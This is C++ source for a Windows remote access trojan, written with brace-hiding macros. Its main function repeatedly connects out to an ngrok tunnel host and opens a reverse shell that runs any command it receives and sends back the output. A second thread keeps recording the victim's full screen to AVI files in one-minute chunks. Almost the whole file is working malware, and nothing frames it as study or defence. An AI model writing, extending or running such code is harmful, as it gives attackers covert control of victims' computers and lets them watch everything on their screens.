#include <bits/stdc++.h>
#include <winsock2.h>
#include <windows.h>
#include <vfw.h>
#include <thread>
#define ll long long
#define MX 100005
#define do {
#define done }
#define echo std::cout<<
#define start_ int main()
#define finish return 0;
#define bzero(p,size) (void)memset((p),0,(size))
#pragma comment(lib, "vfw32.lib")

using namespace std;

int sock;

class Attack {
public:

    void RecordScreen()
    do
        while (true)
        do
            SYSTEMTIME st;
            GetLocalTime(&st);
            char filename[100];
            sprintf(filename, "screen_record_%04d%02d%02d_%02d%02d%02d.avi",
                    st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

            echo "[+] Recording 60s video: "; echo filename; echo "\n";

            AVIFileInit();
            PAVIFILE pfile;
            HRESULT hr = AVIFileOpen(&pfile, filename, OF_WRITE | OF_CREATE, NULL);
            if (hr != 0) continue;

            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);

            AVISTREAMINFO strhdr = { 0 };
            strhdr.fccType = streamtypeVIDEO;
            strhdr.fccHandler = mmioFOURCC('D','I','B',' ');
            strhdr.dwScale = 1;
            strhdr.dwRate = 10;
            strhdr.dwSuggestedBufferSize = width * height * 3;
            SetRect(&strhdr.rcFrame, 0, 0, width, height);

            PAVISTREAM pstream;
            hr = AVIFileCreateStream(pfile, &pstream, &strhdr);
            if (hr != 0) { AVIFileRelease(pfile); continue; }

            BITMAPINFOHEADER bih = { 0 };
            bih.biSize = sizeof(BITMAPINFOHEADER);
            bih.biWidth = width;
            bih.biHeight = height;
            bih.biPlanes = 1;
            bih.biBitCount = 24;
            bih.biCompression = BI_RGB;
            bih.biSizeImage = width * height * 3;

            hr = AVIStreamSetFormat(pstream, 0, &bih, sizeof(bih));
            if (hr != 0) { AVIStreamRelease(pstream); AVIFileRelease(pfile); continue; }

            HDC hScreenDC = GetDC(NULL);
            HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
            HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
            SelectObject(hMemoryDC, hBitmap);

            BYTE* buffer = new BYTE[bih.biSizeImage];
            int frameCount = 0;

            while (frameCount < 600) // 60 seconds at 10 FPS
            do
                BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
                GetDIBits(hMemoryDC, hBitmap, 0, height, buffer, (BITMAPINFO*)&bih, DIB_RGB_COLORS);
                AVIStreamWrite(pstream, frameCount, 1, buffer, bih.biSizeImage, AVIIF_KEYFRAME, NULL, NULL);
                Sleep(100);
                frameCount++;
            done

            delete[] buffer;
            DeleteObject(hBitmap);
            DeleteDC(hMemoryDC);
            ReleaseDC(NULL, hScreenDC);
            AVIStreamRelease(pstream);
            AVIFileRelease(pfile);
            AVIFileExit();

            echo "[+] Saved: "; echo filename; echo "\n";

            Sleep(1000); // Optional pause before next recording
        done
    done

    void Shell()
    do
        char buffer[1024];
        char container[1024];
        char total_response[18384];

        while (true)
        do
            bzero(buffer, sizeof(buffer));
            bzero(container, sizeof(container));
            bzero(total_response, sizeof(total_response));

            int recv_len = recv(sock, buffer, sizeof(buffer), 0);
            if (recv_len <= 0) continue;

            if (strncmp("q", buffer, 1) == 0)
            do
                closesocket(sock);
                exit(0);
            done
            else
            do
                FILE *fp = _popen(buffer, "r");
                if (!fp) continue;

                while (fgets(container, sizeof(container), fp) != NULL)
                do
                    strcat(total_response, container);
                done

                send(sock, total_response, strlen(total_response), 0);
                fclose(fp);
            done
        done
    done
};

start_
do
    WSADATA wsaData;
    struct sockaddr_in x;
    ll port = 15241;
    const char *ip = "0.tcp.in.ngrok.io";

    WSAStartup(MAKEWORD(2, 0), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&x, sizeof(x));

    x.sin_family = AF_INET;
    x.sin_port = htons(port);

    struct hostent *host;
    host = gethostbyname(ip);
    x.sin_addr = *((struct in_addr *)host->h_addr);

    while (connect(sock, (struct sockaddr *)&x, sizeof(x)) != 0)
    do
        Sleep(10);
    done

    Attack a;
    std::thread recorder(&Attack::RecordScreen, &a);
    std::thread shell(&Attack::Shell, &a);

    recorder.join();
    shell.join();

    finish
done
